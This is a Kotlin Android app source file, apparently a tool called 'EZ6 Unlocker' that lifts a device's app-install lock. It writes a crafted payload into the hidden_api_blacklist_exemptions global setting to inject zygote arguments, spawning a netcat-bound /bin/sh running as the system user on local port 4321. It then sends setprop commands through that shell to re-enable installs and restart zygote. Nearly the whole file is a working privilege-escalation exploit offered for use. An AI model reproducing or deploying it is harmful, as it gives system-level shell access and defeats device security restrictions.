package com.autoext.ez6unlocker

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.Executors
import androidx.core.net.toUri

class MainActivity : ComponentActivity() {
    companion object {
        const val TAG = "EZ6_UNLOCKER"
        const val PERMISSION = Manifest.permission.WRITE_SECURE_SETTINGS
        const val APP_INSTALL_DISABLED_PROP = "sys.config.app_install_disabled"
        const val FIXED_PORT = 4321
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            SystemUnlockScreen()
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@SuppressLint("StateFlowValueCalledInComposition")
@Composable
fun SystemUnlockScreen() {
    val context = LocalContext.current
    val viewModel = remember { SystemUnlockViewModel(context) }

    MaterialTheme {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = { Text("System Unlock Tool") },
                )
            }
        ) { paddingValues ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .verticalScroll(rememberScrollState())
                    .padding(paddingValues)
                    .padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                OutlinedButton(
                    onClick = {
                        val intent = Intent(Settings.ACTION_SETTINGS)
                        context.startActivity(intent)
                    }
                ) {
                    Text("Open system settings")
                }

                // Permission Status
                StatusCard(
                    title = "Permission Status",
                    status = viewModel.permissionStatus,
                    color = when {
                        viewModel.hasPermission -> Color(0xFF06B117)
                        else -> Color.Red
                    }
                )

                // Disabled Status
                StatusCard(
                    title = "App Install Status",
                    status = viewModel.disabledStatus,
                    color = when {
                        !viewModel.installDisabled -> Color(0xFF06B117)
                        else -> Color.Red
                    }
                )

                // Permission Hint
                if (!viewModel.hasPermission) {
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        colors = CardDefaults.cardColors(containerColor = Color.Yellow.copy(alpha = 0.2f))
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Text(
                                text = "Permission Required: WRITE_SECURE_SETTINGS",
                                fontWeight = FontWeight.Bold,
                                color = Color.Red
                            )
                            Text(
                                text = "Grant via ADB: adb shell pm grant com.autoext.ez6unlocker android.permission.WRITE_SECURE_SETTINGS",
                                modifier = Modifier.padding(top = 4.dp)
                            )
                        }
                    }
                }

                // Action Buttons
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Button(
                        onClick = { viewModel.checkStatus() },
                        modifier = Modifier.weight(1f),
                        enabled = true
                    ) {
                        Text("Check Status")
                    }

                    Button(
                        onClick = { viewModel.unlockSystem() },
                        modifier = Modifier.weight(1f),
                        enabled = viewModel.canUnlock
                    ) {
                        Text("Unlock System")
                    }

                    Button(
                        onClick = { viewModel.restartSystem() },
                        modifier = Modifier.weight(1f),
                        enabled = viewModel.canRestart
                    ) {
                        Text("Soft Restart")
                    }
                }

                // Log Output
                LogView(logs = viewModel.logs)
            }
        }
    }
}

@Composable
fun StatusCard(title: String, status: String, color: Color) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp)
        ) {
            Text(
                text = title,
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.Bold
            )
            Text(
                text = status,
                style = MaterialTheme.typography.bodyLarge,
                color = color,
                modifier = Modifier.padding(top = 4.dp)
            )
        }
    }
}

@Composable
fun LogView(logs: List<String>) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text(
                text = "Operation Log",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.Bold
            )

            LazyColumn(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(200.dp)
                    .padding(top = 8.dp),
                reverseLayout = true
            ) {
                items(logs) { log ->
                    Text(
                        text = log,
                        style = MaterialTheme.typography.bodySmall,
                        modifier = Modifier.padding(vertical = 2.dp)
                    )
                }
            }
        }
    }
}

class SystemUnlockViewModel(context: Context) {
    private val appContext = context.applicationContext
    private val ioExecutor = Executors.newSingleThreadExecutor()

    var hasPermission by mutableStateOf(false)
        private set
    var installDisabled by mutableStateOf(true)
        private set
    var canUnlock by mutableStateOf(false)
        private set
    var canRestart by mutableStateOf(false)
        private set

    var permissionStatus by mutableStateOf("Not checked")
        private set
    var disabledStatus by mutableStateOf("Not checked")
        private set
    var logs by mutableStateOf(emptyList<String>())
        private set

    init {
        // Check initial state from cache
        canRestart = CacheUtils.getBoolean(appContext, MainActivity.TAG, false)
        checkStatus()
    }

    fun checkStatus() {
        checkPermissions()
        checkDisabledStatus()
        updateUnlockButtonState()
    }

    private fun checkPermissions() {
        val permissionGranted = ContextCompat.checkSelfPermission(
            appContext,
            MainActivity.PERMISSION
        ) == PackageManager.PERMISSION_GRANTED

        hasPermission = permissionGranted
        permissionStatus = if (permissionGranted) {
            "APP has WRITE_SECURE_SETTINGS permission"
        } else {
            "APP does not have WRITE_SECURE_SETTINGS permission"
        }

        if (!permissionGranted) {
            addLog("Please grant permission via ADB: adb shell pm grant com.autoext.ez6unlocker android.permission.WRITE_SECURE_SETTINGS")
        }
    }

    private fun checkDisabledStatus() {
        try {
            val process = Runtime.getRuntime().exec("getprop ${MainActivity.APP_INSTALL_DISABLED_PROP}")
            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                val result = reader.readLine()
                process.destroy()

                when (result) {
                    "true" -> {
                        installDisabled = true
                        disabledStatus = "App installation disabled (prop is true)"
                        addLog("App installation is disabled")
                    }
                    "false" -> {
                        installDisabled = false
                        disabledStatus = "App installation enabled (prop is false)"
                        addLog("App installation is enabled")
                    }
                    else -> {
                        installDisabled = true
                        disabledStatus = "Status unknown ($result)"
                        addLog("App installation status unknown: $result")
                    }
                }
            }
        } catch (e: Exception) {
            installDisabled = true
            disabledStatus = "Check failed"
            addLog("Failed to check app installation status: ${e.message}")
            Log.e(MainActivity.TAG, "Error checking disabled status", e)
        }
    }

    private fun updateUnlockButtonState() {
        Log.d(MainActivity.TAG, "updateUnlockButtonState hasPermission=$hasPermission installDisabled=$installDisabled")
        canUnlock = hasPermission && installDisabled
    }

    fun unlockSystem() {
        if (!hasPermission) {
            Toast.makeText(appContext, "Please get system permissions first", Toast.LENGTH_SHORT).show()
            return
        }

        if (!installDisabled) {
            Toast.makeText(appContext, "App installation is not disabled, no action needed", Toast.LENGTH_SHORT).show()
            return
        }

        // Check if hidden_api_blacklist_exemptions is not empty
        val currentExemptions = getHiddenApiBlacklistExemptions()
        if (!currentExemptions.isNullOrEmpty()) {
            deleteHiddenApiBlacklistExemptions()
            addLog("Cannot inject, hidden_api_blacklist_exemptions is not empty, skipping payload injection")
            Log.d(MainActivity.TAG, "Cannot inject, hidden_api_blacklist_exemptions is not empty, skipping payload injection")
            return
        }

        addLog("......Injecting unlock command......")

        ioExecutor.execute {
            try {
                val values = ContentValues().apply {
                    put("name", "hidden_api_blacklist_exemptions")
                    put("value", getPayload())
                }

                addLog("Executing unlock injection command... settings put global hidden_api_blacklist_exemptions...")

                appContext.contentResolver.insert(
                    "content://settings/global".toUri(),
                    values
                )

                addLog("Unlock command injection successful")
                Log.d(MainActivity.TAG, "Unlock command injection successful")

                deleteHiddenApiBlacklistExemptions()

                // Start monitoring thread
                Thread.sleep(1000)
                if (isPortReachable(MainActivity.FIXED_PORT)) {
                    addLog("Listening port: 4321 (enabled)")
                    setPropCommand()
                } else {
                    addLog("Port connection failed, please retry debugging")
                }
            } catch (e: Exception) {
                deleteHiddenApiBlacklistExemptions()
                addLog("Unlock command injection failed: ${e.message}")
                Log.e(MainActivity.TAG, "Unlock injection failed", e)
            }
        }
    }

    fun restartSystem() {
        // Clear cache flag
        CacheUtils.set(appContext, MainActivity.TAG, false)

        try {
            Thread.sleep(1500)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        }

        addLog(".......Soft restart command......")

        ioExecutor.execute {
            try {
                addLog("Executing soft restart command... setprop ctl.restart zygote")
                Log.d(MainActivity.TAG, "Executing soft restart command: setprop ctl.restart zygote")

                Socket().use { socket ->
                    val address = InetSocketAddress("127.0.0.1", MainActivity.FIXED_PORT)
                    socket.connect(address, 5000)

                    PrintWriter(socket.getOutputStream(), true).use { writer ->
                        writer.println("setprop ctl.restart zygote")
                    }
                }

                addLog("Soft restart command executed successfully")
                Log.d(MainActivity.TAG, "Soft restart command executed successfully")

            } catch (e: Exception) {
                addLog("Soft restart command failed: ${e.message}")
                Log.e(MainActivity.TAG, "Soft restart failed", e)
            }
        }
    }

    private fun getPayload(): String {
        return if (Build.VERSION.SDK_INT <= 30) {
            """
            LClass1;->method1(
            12
            --runtime-args
            --invoke-with
            toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
            --setuid=1000
            --setgid=1000
            --runtime-flags=43267
            --target-sdk-version=30
            --nice-name=com.autoext.ez6unlocker
            --app-data-dir=/data/user/0/com.autoext.ez6unlocker
            --package-name=com.autoext.ez6unlocker
            --seinfo=platform:system_app:targetSdkVersion=30:complete
            android.app.ActivityThread
            """.trimIndent()
        } else {
            buildString {
                repeat(3000) { append("\n") }
                repeat(5157) { append("A") }
                append(
                    """
                    12
                    --runtime-args
                    --invoke-with
                    toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
                    --setuid=1000
                    --setgid=1000
                    --runtime-flags=43267
                    --target-sdk-version=30
                    --nice-name=com.autoext.ez6unlocker
                    --app-data-dir=/data/user/0/com.autoext.ez6unlocker
                    --package-name=com.autoext.ez6unlocker
                    --seinfo=platform:system_app:targetSdkVersion=30:complete
                    android.app.ActivityThread,
                    """.trimIndent()
                )
                repeat(1400) { append("\n,") }
            }
        }
    }

    private fun setPropCommand() {
        val currentExemptions = getHiddenApiBlacklistExemptions()
        if (!currentExemptions.isNullOrEmpty()) {
            deleteHiddenApiBlacklistExemptions()
        }

        addLog("......Executing permission command......")

        ioExecutor.execute {
            try {
                Socket().use { socket ->
                    val address = InetSocketAddress("127.0.0.1", MainActivity.FIXED_PORT)
                    socket.connect(address, 5000)

                    PrintWriter(socket.getOutputStream(), true).use { writer ->
                        writer.println("setprop ${MainActivity.APP_INSTALL_DISABLED_PROP} false")
                    }
                }

                addLog("Executing app permission command... setprop ${MainActivity.APP_INSTALL_DISABLED_PROP} false")
                Log.d(MainActivity.TAG, "Executing app permission command... setprop ${MainActivity.APP_INSTALL_DISABLED_PROP} false")

                // Update UI on main thread
                appContext.mainExecutor.execute {
                    addLog("App permission status successful")
                    Log.d(MainActivity.TAG, "App permission status successful")
                    checkDisabledStatus()
                    canUnlock = false
                    canRestart = true
                    addLog("Please confirm and execute soft restart command...")
                    CacheUtils.set(appContext, MainActivity.TAG, true)
                }

            } catch (e: Exception) {
                appContext.mainExecutor.execute {
                    addLog("Permission status failed: ${e.message}")
                    Log.e(MainActivity.TAG, "Permission status failed", e)
                }
            }
        }
    }

    private fun getHiddenApiBlacklistExemptions(): String? {
        return try {
            appContext.contentResolver.query(
                Settings.Global.CONTENT_URI,
                arrayOf("value"),
                "name = ?",
                arrayOf("hidden_api_blacklist_exemptions"),
                null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getString(cursor.getColumnIndexOrThrow("value"))
                } else {
                    null
                }
            }
        } catch (e: Exception) {
            Log.e(MainActivity.TAG, "Error reading hidden_api_blacklist_exemptions", e)
            null
        }
    }

    private fun deleteHiddenApiBlacklistExemptions(): Boolean {
        addLog(".......Deleting injection command......")
        return try {
            val rowsDeleted = appContext.contentResolver.delete(
                Settings.Global.CONTENT_URI,
                "name = ?",
                arrayOf("hidden_api_blacklist_exemptions")
            )
            Log.d(MainActivity.TAG, "Executing delete injection command... settings delete global hidden_api_blacklist_exemptions, deleted rows: $rowsDeleted")
            addLog("Executing delete injection command... settings delete global hidden_api_blacklist_exemptions, deleted rows: $rowsDeleted")
            true
        } catch (e: Exception) {
            Log.e(MainActivity.TAG, "Delete injection command failed", e)
            addLog("Delete injection command failed: ${e.message}")
            false
        }
    }

    private fun isPortReachable(port: Int): Boolean {
        addLog(".......Checking port status......")
        return try {
            Socket().use { socket ->
                val address = InetSocketAddress("127.0.0.1", port)
                socket.connect(address, 3000)
            }
            addLog("Port status: Port check successful... $port")
            true
        } catch (e: Exception) {
            Log.e(MainActivity.TAG, "Port check failed", e)
            addLog("Port status: Port check failed... ${e.message}")
            addLog("Please continue with one-click unlock command")
            false
        }
    }

    private fun addLog(message: String) {
        logs = listOf(message) + logs.take(100) // Keep last 100 logs
    }
}